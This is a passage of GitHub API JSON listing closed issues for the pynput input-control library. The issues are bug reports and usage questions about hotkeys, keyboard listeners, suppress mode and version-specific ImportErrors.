"gravatar_id": "", "url": "https://api.github.com/users/inceabdullah", "html_url": "https://github.com/inceabdullah", "followers_url": "https://api.github.com/users/inceabdullah/followers", "following_url": "https://api.github.com/users/inceabdullah/following{/other_user}", "gists_url": "https://api.github.com/users/inceabdullah/gists{/gist_id}", "starred_url": "https://api.github.com/users/inceabdullah/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/inceabdullah/subscriptions", "organizations_url": "https://api.github.com/users/inceabdullah/orgs", "repos_url": "https://api.github.com/users/inceabdullah/repos", "events_url": "https://api.github.com/users/inceabdullah/events{/privacy}", "received_events_url": "https://api.github.com/users/inceabdullah/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-03T18:17:58Z", "updated_at": "2020-02-03T18:39:57Z", "closed_at": "2020-02-03T18:39:57Z", "author_association": "NONE", "active_lock_reason": null, "body": "I use Debian 9 in Docker so, I have read similar [issue in Raspberry Pi](https://github.com/moses-palmer/pynput/issues/48). \r\n\r\nI use Ubuntu 16.04 and Debian 9 in Docker. In both I have tried with python2 and python3 and pynput versions: 1.5.2, 1.6.0 and last version, even purge then install again. But does not work.\r\n\r\nI can get mouse position with **Controller().position** but\r\n**Controller().position = (0, 0)**\r\nor\r\n**Controller().move(5, 5)**\r\ndon't work.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/219", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/219/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/219/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/219/events", "html_url": "https://github.com/moses-palmer/pynput/issues/219", "id": 556257034, "node_id": "MDU6SXNzdWU1NTYyNTcwMzQ=", "number": 219, "title": "AttributeError: module 'socket' has no attribute 'AF_UNSPEC'", "user": {"login": "ayushmankumar7", "id": 41910134, "node_id": "MDQ6VXNlcjQxOTEwMTM0", "avatar_url": "https://avatars0.githubusercontent.com/u/41910134?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ayushmankumar7", "html_url": "https://github.com/ayushmankumar7", "followers_url": "https://api.github.com/users/ayushmankumar7/followers", "following_url": "https://api.github.com/users/ayushmankumar7/following{/other_user}", "gists_url": "https://api.github.com/users/ayushmankumar7/gists{/gist_id}", "starred_url": "https://api.github.com/users/ayushmankumar7/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ayushmankumar7/subscriptions", "organizations_url": "https://api.github.com/users/ayushmankumar7/orgs", "repos_url": "https://api.github.com/users/ayushmankumar7/repos", "events_url": "https://api.github.com/users/ayushmankumar7/events{/privacy}", "received_events_url": "https://api.github.com/users/ayushmankumar7/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-01-28T14:45:10Z", "updated_at": "2020-02-04T13:20:42Z", "closed_at": "2020-02-04T13:20:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/218", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/218/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/218/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/218/events", "html_url": "https://github.com/moses-palmer/pynput/issues/218", "id": 549813377, "node_id": "MDU6SXNzdWU1NDk4MTMzNzc=", "number": 218, "title": "Keyboard listener detects key press differently with and without ctrl modifier (1.6.5)", "user": {"login": "ClarinetK622", "id": 29615602, "node_id": "MDQ6VXNlcjI5NjE1NjAy", "avatar_url": "https://avatars0.githubusercontent.com/u/29615602?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ClarinetK622", "html_url": "https://github.com/ClarinetK622", "followers_url": "https://api.github.com/users/ClarinetK622/followers", "following_url": "https://api.github.com/users/ClarinetK622/following{/other_user}", "gists_url": "https://api.github.com/users/ClarinetK622/gists{/gist_id}", "starred_url": "https://api.github.com/users/ClarinetK622/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ClarinetK622/subscriptions", "organizations_url": "https://api.github.com/users/ClarinetK622/orgs", "repos_url": "https://api.github.com/users/ClarinetK622/repos", "events_url": "https://api.github.com/users/ClarinetK622/events{/privacy}", "received_events_url": "https://api.github.com/users/ClarinetK622/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-01-14T20:55:31Z", "updated_at": "2020-01-23T19:36:20Z", "closed_at": "2020-01-23T19:36:20Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi there,\r\nWhen using the keyboard listener to detect keystrokes, having control pressed makes the key code generated by new keys difficult to interpret. For instance, when ctrl is held, pressing 'a' gives keycode '\\x01'. 'b' gives '\\x02' 'm' gives '\\r', etc. For other keys the key code is even more difficult to understand, for instance ';' returns '<186>'. Is this intentional? If so, is there a conversion chart or something that allows us to see the normal key name as if the control modifier were not held down?\r\nI'm using pynput to allow users to define custom hotkeys. This problem arises when users enter hotkeys (involving ctrl) and I try to interpret what keys they are holding down. I imagine it could cause problems in other areas as well.\r\nMuch thanks.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/217", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/217/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/217/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/217/events", "html_url": "https://github.com/moses-palmer/pynput/issues/217", "id": 549394793, "node_id": "MDU6SXNzdWU1NDkzOTQ3OTM=", "number": 217, "title": "The example code in version 1.6.5 document doesn't work", "user": {"login": "jfongattw", "id": 14246387, "node_id": "MDQ6VXNlcjE0MjQ2Mzg3", "avatar_url": "https://avatars3.githubusercontent.com/u/14246387?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jfongattw", "html_url": "https://github.com/jfongattw", "followers_url": "https://api.github.com/users/jfongattw/followers", "following_url": "https://api.github.com/users/jfongattw/following{/other_user}", "gists_url": "https://api.github.com/users/jfongattw/gists{/gist_id}", "starred_url": "https://api.github.com/users/jfongattw/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jfongattw/subscriptions", "organizations_url": "https://api.github.com/users/jfongattw/orgs", "repos_url": "https://api.github.com/users/jfongattw/repos", "events_url": "https://api.github.com/users/jfongattw/events{/privacy}", "received_events_url": "https://api.github.com/users/jfongattw/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-14T07:54:38Z", "updated_at": "2020-01-23T17:49:13Z", "closed_at": "2020-01-23T17:49:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "Windows Vista, Python 3.6.8 32bit\r\nThe example code in \"Global hotkeys\" section,\r\nhotkey = keyboard.HotKey(keyboard.HotKey.parse('<ctrl>+<alt>+h'), on_activate)\r\ndoesn't work. The pressed 'h' key is <72>, not 'h', when ctrl+alt is pressed. Also, the pressed key is Key.ctrl_l. not Key.ctrl\r\n\r\nAnd also, the \"return False\" won't work in on_activate() callback.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/216", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/216/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/216/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/216/events", "html_url": "https://github.com/moses-palmer/pynput/issues/216", "id": 548426447, "node_id": "MDU6SXNzdWU1NDg0MjY0NDc=", "number": 216, "title": "is it possible to listen keyboard input but not show character on display?", "user": {"login": "nquantum", "id": 18653121, "node_id": "MDQ6VXNlcjE4NjUzMTIx", "avatar_url": "https://avatars2.githubusercontent.com/u/18653121?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nquantum", "html_url": "https://github.com/nquantum", "followers_url": "https://api.github.com/users/nquantum/followers", "following_url": "https://api.github.com/users/nquantum/following{/other_user}", "gists_url": "https://api.github.com/users/nquantum/gists{/gist_id}", "starred_url": "https://api.github.com/users/nquantum/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nquantum/subscriptions", "organizations_url": "https://api.github.com/users/nquantum/orgs", "repos_url": "https://api.github.com/users/nquantum/repos", "events_url": "https://api.github.com/users/nquantum/events{/privacy}", "received_events_url": "https://api.github.com/users/nquantum/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-11T12:53:03Z", "updated_at": "2020-01-23T17:13:14Z", "closed_at": "2020-01-23T17:13:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "I scan keyboard input for control output: say for control robot direction a = left, d = right, e = up, s = down. So library is work well on receive input character. However when press any key, the character  also show on display too. Is it possible to just scan keyboard input without show what key that pressed?\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/212", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/212/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/212/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/212/events", "html_url": "https://github.com/moses-palmer/pynput/issues/212", "id": 545287132, "node_id": "MDU6SXNzdWU1NDUyODcxMzI=", "number": 212, "title": "Propose: Registration method to create methods for specific methods", "user": {"login": "JokeNeverSoke", "id": 45055133, "node_id": "MDQ6VXNlcjQ1MDU1MTMz", "avatar_url": "https://avatars0.githubusercontent.com/u/45055133?v=4", "gravatar_id": "", "url": "https://api.github.com/users/JokeNeverSoke", "html_url": "https://github.com/JokeNeverSoke", "followers_url": "https://api.github.com/users/JokeNeverSoke/followers", "following_url": "https://api.github.com/users/JokeNeverSoke/following{/other_user}", "gists_url": "https://api.github.com/users/JokeNeverSoke/gists{/gist_id}", "starred_url": "https://api.github.com/users/JokeNeverSoke/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/JokeNeverSoke/subscriptions", "organizations_url": "https://api.github.com/users/JokeNeverSoke/orgs", "repos_url": "https://api.github.com/users/JokeNeverSoke/repos", "events_url": "https://api.github.com/users/JokeNeverSoke/events{/privacy}", "received_events_url": "https://api.github.com/users/JokeNeverSoke/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-01-04T13:48:49Z", "updated_at": "2020-01-08T14:14:58Z", "closed_at": "2020-01-08T14:14:58Z", "author_association": "NONE", "active_lock_reason": null, "body": "~~I was hoping to write a self-defined keyboard registration~~ (not important)\r\n\r\nThe thing is:\r\n**Would it be possible to map specific keys to specific functions (and suppress those keypresses) without effecting or touching other keypress?**\r\nJust a proposal\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/211", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/211/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/211/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/211/events", "html_url": "https://github.com/moses-palmer/pynput/issues/211", "id": 545254080, "node_id": "MDU6SXNzdWU1NDUyNTQwODA=", "number": 211, "title": "I am use GlobalHotKeys it's neither error nor print(12323) I don't where was wrong", "user": {"login": "WingDust", "id": 45911286, "node_id": "MDQ6VXNlcjQ1OTExMjg2", "avatar_url": "https://avatars2.githubusercontent.com/u/45911286?v=4", "gravatar_id": "", "url": "https://api.github.com/users/WingDust", "html_url": "https://github.com/WingDust", "followers_url": "https://api.github.com/users/WingDust/followers", "following_url": "https://api.github.com/users/WingDust/following{/other_user}", "gists_url": "https://api.github.com/users/WingDust/gists{/gist_id}", "starred_url": "https://api.github.com/users/WingDust/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/WingDust/subscriptions", "organizations_url": "https://api.github.com/users/WingDust/orgs", "repos_url": "https://api.github.com/users/WingDust/repos", "events_url": "https://api.github.com/users/WingDust/events{/privacy}", "received_events_url": "https://api.github.com/users/WingDust/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2020-01-04T07:38:15Z", "updated_at": "2020-04-14T13:47:52Z", "closed_at": "2020-04-14T13:47:52Z", "author_association": "NONE", "active_lock_reason": null, "body": "![2](https://user-images.githubusercontent.com/45911286/71762227-fe8ab080-2f07-11ea-93b9-cda6c196f237.gif)\r\n\r\n![image](https://user-images.githubusercontent.com/45911286/71762254-25e17d80-2f08-11ea-9216-3e55ea69e607.png)\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/210", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/210/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/210/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/210/events", "html_url": "https://github.com/moses-palmer/pynput/issues/210", "id": 544256245, "node_id": "MDU6SXNzdWU1NDQyNTYyNDU=", "number": 210, "title": "Use of Controller().type(string) returns ImportError", "user": {"login": "rhystedstone", "id": 12123847, "node_id": "MDQ6VXNlcjEyMTIzODQ3", "avatar_url": "https://avatars0.githubusercontent.com/u/12123847?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rhystedstone", "html_url": "https://github.com/rhystedstone", "followers_url": "https://api.github.com/users/rhystedstone/followers", "following_url": "https://api.github.com/users/rhystedstone/following{/other_user}", "gists_url": "https://api.github.com/users/rhystedstone/gists{/gist_id}", "starred_url": "https://api.github.com/users/rhystedstone/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rhystedstone/subscriptions", "organizations_url": "https://api.github.com/users/rhystedstone/orgs", "repos_url": "https://api.github.com/users/rhystedstone/repos", "events_url": "https://api.github.com/users/rhystedstone/events{/privacy}", "received_events_url": "https://api.github.com/users/rhystedstone/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-31T19:32:17Z", "updated_at": "2020-01-03T19:14:04Z", "closed_at": "2020-01-03T19:14:04Z", "author_association": "NONE", "active_lock_reason": null, "body": "I seem to get an ImportError each type I call Controller().type(string).\r\nThe following code:\r\n```from pynput.keyboard import Key, Controller\r\nkeyboard = Controller()\r\nkeyboard.type('Hello World')\r\n```\r\nResults in the following error:\r\n```Traceback (most recent call last):\r\n  File \"<pyshell#24>\", line 1, in <module>\r\n    keyboard.type('Hello World')\r\n  File \"C:\\Program Files (x86)\\Python38-32\\lib\\site-packages\\pynput\\keyboard\\_base.py\", line 460, in type\r\n    from .. import _CONTROL_CODES\r\nImportError: cannot import name '_CONTROL_CODES' from 'pynput' (C:\\Program Files (x86)\\Python38-32\\lib\\site-packages\\pynput\\__init__.py)\r\n```\r\nI have checked that I am using the latest version of PynPut & Python, and the error apparently occurs on Python 3.7 & 3.8\r\n\r\n***Edit:*** The problem seems to occur on versions above 1.6.0. I have reinstalled versions 1.6.3, 1.6.2 & 1.6.1, all returning the same error. 1.6.0 seems to be the latest version without the problem. Hope this helps.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/209", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/209/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/209/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/209/events", "html_url": "https://github.com/moses-palmer/pynput/issues/209", "id": 544244789, "node_id": "MDU6SXNzdWU1NDQyNDQ3ODk=", "number": 209, "title": "Need help with starting two listeners simultaneously", "user": {"login": "Peter-Schorn", "id": 58197311, "node_id": "MDQ6VXNlcjU4MTk3MzEx", "avatar_url": "https://avatars1.githubusercontent.com/u/58197311?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Peter-Schorn", "html_url": "https://github.com/Peter-Schorn", "followers_url": "https://api.github.com/users/Peter-Schorn/followers", "following_url": "https://api.github.com/users/Peter-Schorn/following{/other_user}", "gists_url": "https://api.github.com/users/Peter-Schorn/gists{/gist_id}", "starred_url": "https://api.github.com/users/Peter-Schorn/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Peter-Schorn/subscriptions", "organizations_url": "https://api.github.com/users/Peter-Schorn/orgs", "repos_url": "https://api.github.com/users/Peter-Schorn/repos", "events_url": "https://api.github.com/users/Peter-Schorn/events{/privacy}", "received_events_url": "https://api.github.com/users/Peter-Schorn/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-31T18:21:26Z", "updated_at": "2020-01-16T04:38:01Z", "closed_at": "2020-01-08T14:10:19Z", "author_association": "NONE", "active_lock_reason": null, "body": "I've written the following code, which listens for a command+delete hotkey:\r\n```\r\ndef on_activate():\r\n    global query\r\n    print('cmd+del activated!')\r\n    query = '' # those are two single quotes, not one double quote\r\n\r\nwith keyboard.GlobalHotKeys(\r\n        {'<cmd>+<backspace>' or '<cmd_r>+<backspace>': on_activate}) as h: h.join()\r\n```\r\nI also have a listener that records alphanumeric characters:\r\n```\r\ndef on_press(key):\r\n    global query\r\n    try: query += key.char\r\n\r\nquery = ''\r\nwith keyboard.Listener(on_press) as listener: listener.join()\r\n```\r\nHow do I run these sections of code simultaneously?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/208", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/208/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/208/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/208/events", "html_url": "https://github.com/moses-palmer/pynput/issues/208", "id": 543262190, "node_id": "MDU6SXNzdWU1NDMyNjIxOTA=", "number": 208, "title": "cannot import name '_NORMAL_MODIFIERS' from 'pynput'", "user": {"login": "Ivoz", "id": 199266, "node_id": "MDQ6VXNlcjE5OTI2Ng==", "avatar_url": "https://avatars1.githubusercontent.com/u/199266?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Ivoz", "html_url": "https://github.com/Ivoz", "followers_url": "https://api.github.com/users/Ivoz/followers", "following_url": "https://api.github.com/users/Ivoz/following{/other_user}", "gists_url": "https://api.github.com/users/Ivoz/gists{/gist_id}", "starred_url": "https://api.github.com/users/Ivoz/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Ivoz/subscriptions", "organizations_url": "https://api.github.com/users/Ivoz/orgs", "repos_url": "https://api.github.com/users/Ivoz/repos", "events_url": "https://api.github.com/users/Ivoz/events{/privacy}", "received_events_url": "https://api.github.com/users/Ivoz/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-12-28T17:51:23Z", "updated_at": "2019-12-30T17:18:40Z", "closed_at": "2019-12-29T15:33:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "I think latest release broke the `keyboard` module.\r\n\r\nSee https://github.com/moses-palmer/pynput/commit/f58e8f93c7c6510542d0dbd72a351ff911944c6d#r36600476 for details", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/206", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/206/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/206/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/206/events", "html_url": "https://github.com/moses-palmer/pynput/issues/206", "id": 542975634, "node_id": "MDU6SXNzdWU1NDI5NzU2MzQ=", "number": 206, "title": "keyboard.GlobalHotKeys and keyboard.HotKey are not working.", "user": {"login": "microrepar", "id": 7048130, "node_id": "MDQ6VXNlcjcwNDgxMzA=", "avatar_url": "https://avatars3.githubusercontent.com/u/7048130?v=4", "gravatar_id": "", "url": "https://api.github.com/users/microrepar", "html_url": "https://github.com/microrepar", "followers_url": "https://api.github.com/users/microrepar/followers", "following_url": "https://api.github.com/users/microrepar/following{/other_user}", "gists_url": "https://api.github.com/users/microrepar/gists{/gist_id}", "starred_url": "https://api.github.com/users/microrepar/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/microrepar/subscriptions", "organizations_url": "https://api.github.com/users/microrepar/orgs", "repos_url": "https://api.github.com/users/microrepar/repos", "events_url": "https://api.github.com/users/microrepar/events{/privacy}", "received_events_url": "https://api.github.com/users/microrepar/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-12-27T20:02:24Z", "updated_at": "2019-12-27T20:14:02Z", "closed_at": "2019-12-27T20:14:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi guys!\r\nI am trying to run the following code, but I was unsuccessfull.\r\nI wold like to know what I am doing wrong!\r\n\r\n```\r\nfrom pynput import keyboard\r\ndef on_activate_h():\r\n    print('<ctrl>+<alt>+h pressed')\r\ndef on_activate_i():\r\n    print('<ctrl>+<alt>+i pressed')\r\nwith keyboard.GlobalHotKeys({\r\n        '<ctrl>+<alt>+h': on_activate_h,\r\n        '<ctrl>+<alt>+i': on_activate_i}) as h:\r\n    h.join()\r\n```\r\n\r\n\r\n```\r\nUnhandled exception in listener callback\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\r\n    return f(self, *args, **kwargs)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\_util\\win32.py\", line 382, in _handler\r\n    converted = self._convert(code, msg, lpdata)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 244, in _convert\r\n    if self._event_filter(msg, data) is False:\r\nAttributeError: 'GlobalHotKeys' object has no attribute '_event_filter'\r\nTraceback (most recent call last):\r\n  File \"E:\\rpa-py\\teste_hotkeys.py\", line 15, in <module>\r\n    h.join()\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 210, in join\r\n    six.reraise(exc_type, exc_value, exc_traceback)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\six.py\", line 695, in reraise\r\n    raise value.with_traceback(tb)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\_util\\__init__.py\", line 162, in inner\r\n    return f(self, *args, **kwargs)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\_util\\win32.py\", line 382, in _handler\r\n    converted = self._convert(code, msg, lpdata)\r\n  File \"C:\\Users\\m.c.silva\\Envs\\rpa-python-env\\lib\\site-packages\\pynput\\keyboard\\_win32.py\", line 244, in _convert\r\n    if self._event_filter(msg, data) is False:\r\nAttributeError: 'GlobalHotKeys' object has no attribute '_event_filter'\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/205", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/205/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/205/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/205/events", "html_url": "https://github.com/moses-palmer/pynput/issues/205", "id": 542455054, "node_id": "MDU6SXNzdWU1NDI0NTUwNTQ=", "number": 205, "title": "how to suppress the cursor, but still get mouse event", "user": {"login": "Jiang-Le", "id": 14083199, "node_id": "MDQ6VXNlcjE0MDgzMTk5", "avatar_url": "https://avatars3.githubusercontent.com/u/14083199?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Jiang-Le", "html_url": "https://github.com/Jiang-Le", "followers_url": "https://api.github.com/users/Jiang-Le/followers", "following_url": "https://api.github.com/users/Jiang-Le/following{/other_user}", "gists_url": "https://api.github.com/users/Jiang-Le/gists{/gist_id}", "starred_url": "https://api.github.com/users/Jiang-Le/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Jiang-Le/subscriptions", "organizations_url": "https://api.github.com/users/Jiang-Le/orgs", "repos_url": "https://api.github.com/users/Jiang-Le/repos", "events_url": "https://api.github.com/users/Jiang-Le/events{/privacy}", "received_events_url": "https://api.github.com/users/Jiang-Le/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-12-26T06:50:34Z", "updated_at": "2020-01-03T05:04:53Z", "closed_at": "2020-01-03T05:04:41Z", "author_association": "NONE", "active_lock_reason": null, "body": "I want to suppress the cursor move, but still get movement distance of mouse. When `suppress`  set to be `True`, the position of cursor is printed like:\r\n![image](https://user-images.githubusercontent.com/14083199/71462457-444fc680-27ee-11ea-9d21-5e26eedd9574.png)\r\n\r\nis there some way to filter such positions in the green frame? thank you~\r\n\r\nP.S.\r\npynput 1.4", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/203", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/203/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/203/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/203/events", "html_url": "https://github.com/moses-palmer/pynput/issues/203", "id": 540974408, "node_id": "MDU6SXNzdWU1NDA5NzQ0MDg=", "number": 203, "title": "Question about \"supress\" mode", "user": {"login": "segalion", "id": 26971667, "node_id": "MDQ6VXNlcjI2OTcxNjY3", "avatar_url": "https://avatars2.githubusercontent.com/u/26971667?v=4", "gravatar_id": "", "url": "https://api.github.com/users/segalion", "html_url": "https://github.com/segalion", "followers_url": "https://api.github.com/users/segalion/followers", "following_url": "https://api.github.com/users/segalion/following{/other_user}", "gists_url": "https://api.github.com/users/segalion/gists{/gist_id}", "starred_url": "https://api.github.com/users/segalion/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/segalion/subscriptions", "organizations_url": "https://api.github.com/users/segalion/orgs", "repos_url": "https://api.github.com/users/segalion/repos", "events_url": "https://api.github.com/users/segalion/events{/privacy}", "received_events_url": "https://api.github.com/users/segalion/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-12-20T12:36:01Z", "updated_at": "2019-12-23T19:39:06Z", "closed_at": "2019-12-23T19:39:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "I would like to globally disable all keys and mouse events for a while (i.e. while my rpi is powering TV on waking-up from a sleep-time), and I have seen 'supress' mode on listeners, to do that.\r\n\r\nHow it works when create two listeners, first with supress, and second without supress?\r\nSecond listener receive events?\r\nCould be possible to has 'supress' mode dinamically enabled and disabled on the listener? I.e `keyboard_listener.supress()`, `keyboard_listener.unsupress()` \r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/202", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/202/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/202/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/202/events", "html_url": "https://github.com/moses-palmer/pynput/issues/202", "id": 539531923, "node_id": "MDU6SXNzdWU1Mzk1MzE5MjM=", "number": 202, "title": "Control-press+control-release + 'a'-keypress  = receive '\\x01' in 'on_press' (windows)", "user": {"login": "segalion", "id": 26971667, "node_id": "MDQ6VXNlcjI2OTcxNjY3", "avatar_url": "https://avatars2.githubusercontent.com/u/26971667?v=4", "gravatar_id": "", "url": "https://api.github.com/users/segalion", "html_url": "https://github.com/segalion", "followers_url": "https://api.github.com/users/segalion/followers", "following_url": "https://api.github.com/users/segalion/following{/other_user}", "gists_url": "https://api.github.com/users/segalion/gists{/gist_id}", "starred_url": "https://api.github.com/users/segalion/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/segalion/subscriptions", "organizations_url": "https://api.github.com/users/segalion/orgs", "repos_url": "https://api.github.com/users/segalion/repos", "events_url": "https://api.github.com/users/segalion/events{/privacy}", "received_events_url": "https://api.github.com/users/segalion/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-12-18T08:33:08Z", "updated_at": "2019-12-19T20:05:27Z", "closed_at": "2019-12-19T20:05:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "if I press any key just after I press and release any Control key (left or right), I receive key code as control was pressed on 